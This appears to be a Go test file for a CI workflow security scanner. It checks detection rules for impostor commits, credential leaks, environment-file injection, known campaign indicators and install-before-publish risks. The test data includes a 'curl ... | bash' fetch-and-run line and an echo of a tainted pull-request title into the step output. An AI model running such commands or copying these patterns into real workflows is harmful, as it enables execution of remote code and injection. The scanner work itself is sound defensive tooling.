package scanner

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// --- FG-018: Impostor Commit ---

func TestCheckImpostorCommit(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/impostor-commit.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckImpostorCommit(wf)

	// Should flag exactly 1: some-org/some-action with SHA
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.RuleID != "FG-018" {
		t.Errorf("expected FG-018, got %s", f.RuleID)
	}
	if f.Severity != SeverityInfo {
		t.Errorf("expected info severity, got %s", f.Severity)
	}
}

// Regression: actions-cool/issues-helper + actions-cool/maintain-one-comment
// supply chain attack (May 2026). All tags were retargeted to impostor commits;
// only a full-SHA from the original repo was safe. We expect FG-018 to flag the
// SHA-pinned use of actions-cool/* (unknown org, SHA-pinned) and ignore the
// tag-pinned form (FG-003 handles that) and the safe-org control.
func TestCheckImpostorCommit_ActionsCoolCampaign(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/impostor-commit-actions-cool.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckImpostorCommit(wf)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.RuleID != "FG-018" {
		t.Errorf("expected FG-018, got %s", f.RuleID)
	}
	if !strings.Contains(f.Message, "actions-cool/maintain-one-comment") {
		t.Errorf("expected message to name actions-cool/maintain-one-comment, got: %s", f.Message)
	}
}

func TestCheckImpostorCommit_SafeOrgs(t *testing.T) {
	wf := &Workflow{
		Path: "test.yaml",
		Jobs: map[string]Job{
			"build": {
				Steps: []Step{
					{Uses: "actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11"},
					{Uses: "github/codeql-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
					{Uses: "hashicorp/setup-terraform@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
					{Uses: "google-github-actions/auth@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
					{Uses: "aws-actions/configure-aws-credentials@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
					{Uses: "azure/login@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
					{Uses: "docker/build-push-action@a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2"},
				},
			},
		},
	}
	findings := CheckImpostorCommit(wf)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for safe orgs, got %d", len(findings))
	}
}

// --- FG-019: Hardcoded Container Credentials ---

func TestCheckHardcodedCredentials(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/hardcoded-credentials.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckHardcodedCredentials(wf)

	// Should flag: literal creds job, inline creds in image, service literal creds
	// Should NOT flag: secrets ref job, safe-sha-image job
	if len(findings) < 3 {
		t.Fatalf("expected at least 3 findings, got %d: %v", len(findings), findings)
	}

	for _, f := range findings {
		if f.RuleID != "FG-019" {
			t.Errorf("expected FG-019, got %s", f.RuleID)
		}
		if f.Severity != SeverityHigh {
			t.Errorf("expected high severity, got %s for: %s", f.Severity, f.Message)
		}
	}
}

func TestCheckHardcodedCredentials_SecretsRef(t *testing.T) {
	wf := &Workflow{
		Path: "test.yaml",
		Jobs: map[string]Job{
			"safe": {
				Container: ContainerConfig{
					Image: "ghcr.io/myorg/myimage:latest",
					Credentials: map[string]string{
						"username": "${{ secrets.REG_USER }}",
						"password": "${{ secrets.REG_PASS }}",
					},
				},
			},
		},
	}
	findings := CheckHardcodedCredentials(wf)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for secrets ref, got %d: %v", len(findings), findings)
	}
}

// --- FG-020: Ref Confusion ---

func TestCheckRefConfusion(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/ref-confusion.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckRefConfusion(wf)

	// Should flag: release/v1 and stable on third-party actions
	if len(findings) != 2 {
		t.Fatalf("expected 2 findings, got %d: %v", len(findings), findings)
	}
	for _, f := range findings {
		if f.RuleID != "FG-020" {
			t.Errorf("expected FG-020, got %s", f.RuleID)
		}
		if f.Severity != SeverityMedium {
			t.Errorf("expected medium severity, got %s", f.Severity)
		}
	}
}

// --- FG-021: Cross-Step Output Taint ---

func TestCheckCrossStepOutputTaint(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/cross-step-output-taint.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckCrossStepOutputTaint(wf)

	// Should flag the tainted output in the build job only
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
	}
	f := findings[0]
	if f.RuleID != "FG-021" {
		t.Errorf("expected FG-021, got %s", f.RuleID)
	}
	if f.Severity != SeverityHigh {
		t.Errorf("expected high severity, got %s", f.Severity)
	}
}

func TestCheckCrossStepOutputTaint_NoID(t *testing.T) {
	// Steps without IDs cannot be referenced, so no taint tracking
	wf := &Workflow{
		Path: "test.yaml",
		Jobs: map[string]Job{
			"build": {
				Steps: []Step{
					{
						Run: `echo "title=${{ github.event.pull_request.title }}" >> $GITHUB_OUTPUT`,
					},
					{
						Run: `echo "hello"`,
					},
				},
			},
		},
	}
	findings := CheckCrossStepOutputTaint(wf)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for steps without IDs, got %d", len(findings))
	}
}

// --- FG-022: Known Vulnerable Actions ---

func TestCheckKnownVulnerableActions(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/known-vulnerable-action.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckKnownVulnerableActions(wf)

	// Should flag:
	//   tj-actions@v44, actions/checkout@v4.1.0, docker/build-push-action@v4.1.0,
	//   actions-cool/issues-helper@v3, actions-cool/maintain-one-comment@<sha>
	// Should NOT flag: actions/checkout@v4.2.0, tj-actions@v45.0.1, tj-actions SHA-pinned
	if len(findings) != 5 {
		t.Fatalf("expected 5 findings, got %d: %v", len(findings), findings)
	}

	hasHigh := false
	hasMedium := false
	hasCritical := false
	criticalActions := map[string]bool{}
	for _, f := range findings {
		if f.RuleID != "FG-022" {
			t.Errorf("expected FG-022, got %s", f.RuleID)
		}
		switch f.Severity {
		case SeverityCritical:
			hasCritical = true
			if strings.Contains(f.Message, "actions-cool/issues-helper") {
				criticalActions["issues-helper"] = true
			}
			if strings.Contains(f.Message, "actions-cool/maintain-one-comment") {
				criticalActions["maintain-one-comment"] = true
			}
		case SeverityHigh:
			hasHigh = true
		case SeverityMedium:
			hasMedium = true
		}
	}
	if !hasHigh {
		t.Error("expected at least one high severity finding (tj-actions)")
	}
	if !hasMedium {
		t.Error("expected at least one medium severity finding")
	}
	if !hasCritical {
		t.Error("expected at least one critical severity finding (actions-cool)")
	}
	if !criticalActions["issues-helper"] || !criticalActions["maintain-one-comment"] {
		t.Errorf("expected both actions-cool entries flagged as critical, got: %v", criticalActions)
	}
}

func TestVersionLessThan(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{"v1", "v2", true},
		{"v1.0.0", "v1.0.1", true},
		{"v4.1.0", "v4.2.0", true},
		{"v44", "v45.0.0", true},
		{"v4.2.0", "v4.2.0", false},
		{"v5", "v4", false},
		{"v45.0.1", "v45.0.0", false},
	}
	for _, tt := range tests {
		got := versionLessThan(tt.a, tt.b)
		if got != tt.want {
			t.Errorf("versionLessThan(%q, %q) = %v, want %v", tt.a, tt.b, got, tt.want)
		}
	}
}

// --- FG-023: Artifact Credential Leak ---

func TestCheckArtifactCredentialLeak(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/artifact-credential-leak.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckArtifactCredentialLeak(wf)

	// Should flag: upload-git-dir, upload-whole-workspace, upload-workspace-expr (medium)
	// Should flag: safe-persist-false (info)
	// Should NOT flag: safe-specific-path
	if len(findings) < 4 {
		t.Fatalf("expected at least 4 findings, got %d: %v", len(findings), findings)
	}

	mediumCount := 0
	infoCount := 0
	for _, f := range findings {
		if f.RuleID != "FG-023" {
			t.Errorf("expected FG-023, got %s", f.RuleID)
		}
		switch f.Severity {
		case SeverityMedium:
			mediumCount++
		case SeverityInfo:
			infoCount++
		}
	}
	if mediumCount < 3 {
		t.Errorf("expected at least 3 medium findings, got %d", mediumCount)
	}
	if infoCount < 1 {
		t.Errorf("expected at least 1 info finding (persist-credentials: false), got %d", infoCount)
	}
}

func TestCheckGitHubEnvInjection(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/github-env-injection.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckGitHubEnvInjection(wf)

	jobsFlagged := map[string]string{}
	for _, f := range findings {
		if f.RuleID != "FG-024" {
			t.Errorf("expected FG-024, got %s", f.RuleID)
		}
		// Use the matched line as a rough proxy for which job flagged.
		jobsFlagged[f.Message] = f.Severity
	}

	// Expected: 5 findings —
	//   2 critical (high-taint to ENV, high-taint to PATH),
	//   2 high (med-taint head_ref + label-gated critical→high one-step downgrade),
	//   1 info (fork-guarded — internal-collaborator only).
	// Static write and unrelated redirect produce nothing.
	if len(findings) != 5 {
		t.Fatalf("expected 5 findings, got %d: %v", len(findings), findings)
	}

	criticalCount, highCount, infoCount := 0, 0, 0
	for _, f := range findings {
		switch f.Severity {
		case SeverityCritical:
			criticalCount++
		case SeverityHigh:
			highCount++
		case SeverityInfo:
			infoCount++
		}
	}
	if criticalCount != 2 {
		t.Errorf("expected 2 critical findings (high-taint ENV + PATH), got %d", criticalCount)
	}
	if highCount != 2 {
		t.Errorf("expected 2 high findings (med-taint head_ref + label-gated critical→high), got %d", highCount)
	}
	if infoCount != 1 {
		t.Errorf("expected 1 info finding (fork-guarded — internal threat only), got %d", infoCount)
	}

	// Verify GITHUB_PATH is named in at least one finding's message.
	pathMentioned := false
	for _, f := range findings {
		if strings.Contains(f.Message, "GITHUB_PATH") {
			pathMentioned = true
			break
		}
	}
	if !pathMentioned {
		t.Error("expected at least one finding to reference GITHUB_PATH")
	}
}

func TestCheckGitHubEnvInjection_PullRequestNoSecrets(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/github-env-injection-pr.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckGitHubEnvInjection(wf)
	if len(findings) != 1 {
		t.Fatalf("expected 1 finding on pull_request, got %d", len(findings))
	}
	// On pull_request the threat model lacks secrets — cap at high even with high-taint source.
	if findings[0].Severity != SeverityHigh {
		t.Errorf("expected high severity on pull_request (no secrets from forks), got %s", findings[0].Severity)
	}
}

func TestCheckGitHubEnvInjection_PushOutOfScope(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/github-env-injection-push.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckGitHubEnvInjection(wf)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings on push (authenticated-actor context), got %d: %v", len(findings), findings)
	}
}

// --- FG-025: Known Threat-Actor IOC ---

func TestCheckKnownIOCs(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/known-ioc.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}
	findings := CheckKnownIOCs(wf)
	// Expect 3 hits: exfil-run (run block), env-marker (env value), with-marker (with input).
	// The clean-job should produce 0 hits.
	if len(findings) != 3 {
		t.Fatalf("expected 3 findings, got %d: %v", len(findings), findings)
	}

	seenWhere := map[string]bool{}
	for _, f := range findings {
		if f.RuleID != "FG-025" {
			t.Errorf("expected FG-025, got %s", f.RuleID)
		}
		if f.Severity != SeverityCritical {
			t.Errorf("expected critical severity, got %s", f.Severity)
		}
		if !strings.Contains(f.Message, "Mini Shai-Hulud") {
			t.Errorf("expected campaign tag in message, got: %s", f.Message)
		}
		switch {
		case strings.Contains(f.Message, "run block"):
			seenWhere["run"] = true
		case strings.Contains(f.Message, "env."):
			seenWhere["env"] = true
		case strings.Contains(f.Message, "with."):
			seenWhere["with"] = true
		}
	}
	if !seenWhere["run"] || !seenWhere["env"] || !seenWhere["with"] {
		t.Errorf("expected hits in run/env/with, got: %v", seenWhere)
	}
}

func TestCheckKnownIOCs_NoFalsePositive(t *testing.T) {
	wf := &Workflow{
		Path: "test.yaml",
		Jobs: map[string]Job{
			"build": {
				Steps: []Step{
					{Run: "curl https://example.com/payload | bash", Env: map[string]string{"X": "hello"}},
					{Uses: "actions/checkout@v4"},
				},
			},
		},
	}
	findings := CheckKnownIOCs(wf)
	if len(findings) != 0 {
		t.Errorf("expected 0 findings for clean workflow, got %d: %v", len(findings), findings)
	}
}

// --- FG-026: Lifecycle Install Before Credentialed Operation ---

func TestCheckLifecycleInstallBeforeCredentialedOperation(t *testing.T) {
	wf, err := ParseWorkflowFile("../../test/fixtures/lifecycle-install-before-publish.yaml")
	if err != nil {
		t.Fatalf("parse error: %v", err)
	}

	findings := CheckLifecycleInstallBeforeCredentialedOperation(wf)
	if len(findings) != 4 {
		t.Fatalf("expected 4 findings, got %d: %v", len(findings), findings)
	}

	seen := map[string]bool{}
	for _, f := range findings {
		if f.RuleID != "FG-026" {
			t.Errorf("expected FG-026, got %s", f.RuleID)
		}
		switch {
		case strings.Contains(f.Message, "npm-critical"):
			seen["npm"] = true
			if f.Severity != SeverityCritical {
				t.Errorf("expected critical for external-trigger npm job, got %s", f.Severity)
			}
		case strings.Contains(f.Message, "pypi-medium"):
			seen["pip"] = true
			if !strings.Contains(f.Message, "pip") {
				t.Errorf("expected pip ecosystem in message, got %s", f.Message)
			}
		case strings.Contains(f.Message, "gem-medium"):
			seen["gem"] = true
			if !strings.Contains(f.Message, "gem") {
				t.Errorf("expected gem ecosystem in message, got %s", f.Message)
			}
		case strings.Contains(f.Message, "action-install-action-publish"):
			seen["action"] = true
			if !strings.Contains(f.Message, "npm publish") {
				t.Errorf("expected action-based npm publish in message, got %s", f.Message)
			}
		case strings.Contains(f.Message, "npm-ignore-scripts"),
			strings.Contains(f.Message, "npm-npmrc-ignore-scripts"),
			strings.Contains(f.Message, "separated-install"),
			strings.Contains(f.Message, "publish-only"),
			strings.Contains(f.Message, "action-install-suppressed"):
			t.Errorf("unexpected finding for mitigated/separate job: %s", f.Message)
		}
	}
	if !seen["npm"] || !seen["pip"] || !seen["gem"] || !seen["action"] {
		t.Errorf("expected npm, pip, gem, and action-based findings, saw %v", seen)
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_SeverityTiers(t *testing.T) {
	makeWorkflow := func(env string, dispatch bool, jobIf string) *Workflow {
		wf := &Workflow{
			Path: "release.yaml",
			On:   TriggerConfig{Push: true},
			Permissions: PermissionsConfig{
				Set:    true,
				Scopes: map[string]string{"contents": "read"},
			},
			Jobs: map[string]Job{
				"release": {
					Environment: env,
					If:          jobIf,
					Steps: []Step{
						{Run: "npm ci", Line: 10},
						{Run: "npm publish", Line: 12, Env: map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"}},
					},
				},
			},
		}
		if dispatch {
			wf.On = TriggerConfig{WorkflowDispatch: true}
		}
		return wf
	}

	tagGuard := "startsWith(github.ref, 'refs/tags/')"

	cases := []struct {
		name     string
		wf       *Workflow
		expected string
	}{
		{"push no environment", makeWorkflow("", false, ""), SeverityHigh},
		{"push with environment", makeWorkflow("npm", false, ""), SeverityMedium},
		{"push with tag guard", makeWorkflow("", false, tagGuard), SeverityMedium},
		{"push with environment and tag guard", makeWorkflow("npm", false, tagGuard), SeverityLow},
		// workflow_dispatch alone (no companion push/PR) is repo-writer-gated:
		// only actors with `actions: write` can trigger. Treated as repo-writer
		// tier alongside tag-only push and release events.
		{"dispatch no environment", makeWorkflow("", true, ""), SeverityMedium},
		{"dispatch with environment", makeWorkflow("npm", true, ""), SeverityLow},
		{"dispatch with tag guard", makeWorkflow("", true, tagGuard), SeverityLow},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := CheckLifecycleInstallBeforeCredentialedOperation(tc.wf)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
			}
			if findings[0].Severity != tc.expected {
				t.Fatalf("expected %s, got %s", tc.expected, findings[0].Severity)
			}
		})
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_ForkExclusionAndAuthorGuard(t *testing.T) {
	// Build a workflow whose only triggers are the requested external set plus a
	// publish job with an install step that may carry an `if:` (fork-exclusion).
	build := func(triggers TriggerConfig, jobIf, installIf string) *Workflow {
		return &Workflow{
			Path: "release.yaml",
			On:   triggers,
			Permissions: PermissionsConfig{
				Set:    true,
				Scopes: map[string]string{"contents": "read"},
			},
			Jobs: map[string]Job{
				"release": {
					If: jobIf,
					Steps: []Step{
						{Run: "npm ci", If: installIf, Line: 10},
						{Run: "npm publish", Line: 12, Env: map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"}},
					},
				},
			},
		}
	}

	prt := TriggerConfig{PullRequestTarget: true}
	prtAndComment := TriggerConfig{PullRequestTarget: true, IssueComment: true}
	commentOnly := TriggerConfig{IssueComment: true}

	authorGuard := "github.event.comment.author_association != 'NONE' && github.event.comment.author_association != 'FIRST_TIME_CONTRIBUTOR'"
	forkExclusion := "steps.context.outputs.is_fork != 'true'"
	sameRepoGuard := "github.event.pull_request.head.repo.full_name == github.repository"

	cases := []struct {
		name     string
		wf       *Workflow
		expected string
	}{
		// Baseline: PRT alone, no mitigations → critical.
		{"PRT only, no guards", build(prt, "", ""), SeverityCritical},

		// PRT only + fork-exclusion at install step → PRT drops from external set,
		// no other external triggers, falls to internal-trigger tier → high.
		{"PRT only, install step excludes forks (is_fork output)", build(prt, "", forkExclusion), SeverityHigh},
		{"PRT only, install step excludes forks (same-repo guard)", build(prt, "", sameRepoGuard), SeverityHigh},

		// PRT + IssueComment: fork-exclusion only drops PRT, IssueComment keeps
		// external tier → critical.
		{"PRT+comment, install excludes forks (only)", build(prtAndComment, "", forkExclusion), SeverityCritical},

		// PRT + IssueComment + author_association guard at job level + fork-
		// exclusion at install: both signals applied → critical → -1 = high.
		{"PRT+comment, fork-excluded + author-association", build(prtAndComment, authorGuard, forkExclusion), SeverityHigh},

		// IssueComment alone + author_association → critical → -1 = high.
		{"IssueComment only, author-association guard", build(commentOnly, authorGuard, ""), SeverityHigh},

		// IssueComment alone, no guard → critical baseline.
		{"IssueComment only, no guards", build(commentOnly, "", ""), SeverityCritical},

		// PRT only + fork-exclusion + author-association → external surface
		// drained (no other external triggers), falls to internal tier → high →
		// -1 (author) = medium. Closest synthetic match to the rhai-org-pulse
		// claude-review.yml shape.
		{"PRT only, fork-excluded + author-association", build(prt, authorGuard, forkExclusion), SeverityMedium},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := CheckLifecycleInstallBeforeCredentialedOperation(tc.wf)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
			}
			if findings[0].Severity != tc.expected {
				t.Fatalf("expected %s, got %s — reason: %s", tc.expected, findings[0].Severity, findings[0].Message)
			}
		})
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_RepoWriterTriggers(t *testing.T) {
	// Synthesizes the most common Red Hat publish-workflow shapes from the
	// 2026-06-01 org sweep: tag-only push, release event, and the
	// pull_request:closed + bot-login-allowlist pattern used by rhdh-plugins
	// and community-plugins.
	build := func(triggers TriggerConfig, jobIf string) *Workflow {
		return &Workflow{
			Path: "release.yaml",
			On:   triggers,
			Permissions: PermissionsConfig{
				Set:    true,
				Scopes: map[string]string{"contents": "read"},
			},
			Jobs: map[string]Job{
				"release": {
					If: jobIf,
					Steps: []Step{
						{Run: "npm ci", Line: 10},
						{Run: "npm publish", Line: 12, Env: map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"}},
					},
				},
			},
		}
	}

	tagOnlyPush := TriggerConfig{Push: true, PushTagsOnly: true}
	releaseEvent := TriggerConfig{Release: true}
	releaseEventWithDispatch := TriggerConfig{Release: true, WorkflowDispatch: true}
	pushTagsAndBareDispatch := TriggerConfig{Push: true, PushTagsOnly: true, WorkflowDispatch: true}
	dispatchPlusBranchPush := TriggerConfig{Push: true, WorkflowDispatch: true}
	botAllowlist := "github.event.pull_request.user.login == 'rhdh-bot' && github.event.pull_request.merged == true"
	actorAllowlist := "github.actor == 'backstage-service'"
	pullRequestClosed := TriggerConfig{PullRequest: true}

	cases := []struct {
		name     string
		wf       *Workflow
		expected string
	}{
		// Tag-only push: maps to the yaml-language-server / vscode-extension-* shape.
		// Repo-writer trigger tier, no other mitigations → medium.
		{"tag-only push, no env", build(tagOnlyPush, ""), SeverityMedium},
		{"tag-only push, with env", build(tagOnlyPush, ""), SeverityMedium}, // env added below
		// Release event: aegis-ai / osidb-bindings / backstage-odo-devfile-plugin shape.
		{"release event only", build(releaseEvent, ""), SeverityMedium},
		// Release + workflow_dispatch combined: gated trigger still wins because dispatch
		// is repo-writer-only too.
		{"release + dispatch", build(releaseEventWithDispatch, ""), SeverityMedium},
		// Tag-only push + workflow_dispatch: same — both are repo-writer-only.
		{"tag-only push + dispatch", build(pushTagsAndBareDispatch, ""), SeverityMedium},
		// Dispatch + branch push (not tag-only): the push surface dominates;
		// dispatch's repo-writer gate doesn't help. Falls to internal-trigger tier.
		{"dispatch + branch push", build(dispatchPlusBranchPush, ""), SeverityHigh},
		// pull_request:closed with bot-login allowlist on job.If — rhdh-plugins
		// release_workspace_version shape. PR trigger → internal-trigger tier
		// (PR isn't in our external set), then author-allowlist downgrades → medium.
		{"PR + bot-login allowlist", build(pullRequestClosed, botAllowlist), SeverityMedium},
		// github.actor allowlist on a push trigger — same downgrade.
		{"push + actor allowlist", build(TriggerConfig{Push: true}, actorAllowlist), SeverityMedium},
	}

	// Patch the "with env" case to add the environment field.
	cases[1].wf.Jobs["release"] = func() Job {
		j := cases[1].wf.Jobs["release"]
		j.Environment = "npm"
		return j
	}()
	cases[1].expected = SeverityLow

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			findings := CheckLifecycleInstallBeforeCredentialedOperation(tc.wf)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
			}
			if findings[0].Severity != tc.expected {
				t.Fatalf("expected %s, got %s — reason: %s", tc.expected, findings[0].Severity, findings[0].Message)
			}
		})
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_CredentialClasses(t *testing.T) {
	// When the credentialed op after the install is github-token only (gh
	// release / softprops-action-gh-release / etc.), severity should drop to
	// info regardless of trigger surface. Matches the consoledot-e2e and
	// openshift/cac-content-fork pattern from the 2026-06-01 triage.
	tests := []struct {
		name    string
		opRun   string
		opUses  string
		opEnv   map[string]string // env on the publish step; non-GITHUB_TOKEN values prevent downgrade
		expects string
	}{
		{
			name:    "gh release create only -> github-token -> info",
			opRun:   "gh release create v1.0.0 dist/*",
			expects: SeverityInfo,
		},
		{
			name:    "softprops/action-gh-release only -> github-token -> info",
			opUses:  "softprops/action-gh-release@v1",
			expects: SeverityInfo,
		},
		{
			name:    "gh release with NPM_TOKEN env on publish step -> planted-hook risk -> no downgrade",
			opRun:   "gh release create v1.0.0 dist/*",
			opEnv:   map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"},
			expects: SeverityHigh,
		},
		{
			name:    "npm publish (registry) -> normal tier, no downgrade",
			opRun:   "npm publish",
			opEnv:   map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"},
			expects: SeverityHigh,
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			wf := &Workflow{
				Path: "release.yaml",
				On:   TriggerConfig{Push: true},
				Permissions: PermissionsConfig{
					Set:    true,
					Scopes: map[string]string{"contents": "write"}, // satisfies gh-release credential gate
				},
				Jobs: map[string]Job{
					"release": {
						Steps: []Step{
							{Run: "npm ci", Line: 10},
							{Run: tc.opRun, Uses: tc.opUses, Line: 12, Env: tc.opEnv},
						},
					},
				},
			}
			findings := CheckLifecycleInstallBeforeCredentialedOperation(wf)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
			}
			if findings[0].Severity != tc.expects {
				t.Fatalf("expected %s, got %s — reason: %s", tc.expects, findings[0].Severity, findings[0].Message)
			}
		})
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_PublishStepGuard(t *testing.T) {
	// Mirror of installStepExcludesForks but on the publish step. When the
	// credentialed op's own if: restricts to push-to-main / internal triggers,
	// the install can still run on PRs but no credential is reachable on those
	// runs. yaml-language-server CI.yaml is the prototype case.
	tests := []struct {
		name    string
		opIf    string
		expects string
	}{
		{
			name:    "publish gated to push event_name -> drops PR/external",
			opIf:    "github.event_name == 'push'",
			expects: SeverityHigh, // push trigger; PR drops out; falls to internal tier
		},
		{
			name:    "publish gated to refs/heads/main -> drops other refs",
			opIf:    "github.ref == 'refs/heads/main'",
			expects: SeverityHigh,
		},
		{
			name:    "no publish guard, PR + push triggers -> external tier",
			opIf:    "",
			expects: SeverityCritical, // PR is external; no env/tag guard
		},
	}

	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			wf := &Workflow{
				Path: "release.yaml",
				On:   TriggerConfig{Push: true, PullRequest: true, PullRequestTarget: true},
				Permissions: PermissionsConfig{
					Set:    true,
					Scopes: map[string]string{"contents": "read"},
				},
				Jobs: map[string]Job{
					"build": {
						Steps: []Step{
							{Run: "npm ci", Line: 10},
							{Run: "npm publish", If: tc.opIf, Line: 12, Env: map[string]string{"NODE_AUTH_TOKEN": "${{ secrets.NPM_TOKEN }}"}},
						},
					},
				},
			}
			findings := CheckLifecycleInstallBeforeCredentialedOperation(wf)
			if len(findings) != 1 {
				t.Fatalf("expected 1 finding, got %d: %v", len(findings), findings)
			}
			if findings[0].Severity != tc.expects {
				t.Fatalf("expected %s, got %s — reason: %s", tc.expects, findings[0].Severity, findings[0].Message)
			}
		})
	}
}

func TestCheckLifecycleInstallBeforeCredentialedOperation_RepoNPMRC(t *testing.T) {
	dir := t.TempDir()
	workflowDir := filepath.Join(dir, ".github", "workflows")
	if err := os.MkdirAll(workflowDir, 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, ".npmrc"), []byte("ignore-scripts=true\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	workflow := []byte(`name: release
on: push
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - run: npm ci
      - run: npm publish
        env:
          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}
`)
	path := filepath.Join(workflowDir, "release.yaml")
	if err := os.WriteFile(path, workflow, 0o644); err != nil {
		t.Fatal(err)
	}

	wf, err := ParseWorkflowFile(path)
	if err != nil {
		t.Fatal(err)
	}
	findings := CheckLifecycleInstallBeforeCredentialedOperation(wf)
	if len(findings) != 0 {
		t.Fatalf("expected repo .npmrc ignore-scripts=true to suppress finding, got %d: %v", len(findings), findings)
	}
}

// --- AllRules completeness ---

func TestAllRules_IncludesNewRules(t *testing.T) {
	rules := AllRules()
	expectedIDs := []string{"FG-018", "FG-019", "FG-020", "FG-021", "FG-022", "FG-023", "FG-024", "FG-025", "FG-026"}
	for _, id := range expectedIDs {
		if _, ok := rules[id]; !ok {
			t.Errorf("AllRules() missing %s", id)
		}
		if _, ok := RuleDescriptions[id]; !ok {
			t.Errorf("RuleDescriptions missing %s", id)
		}
	}
}
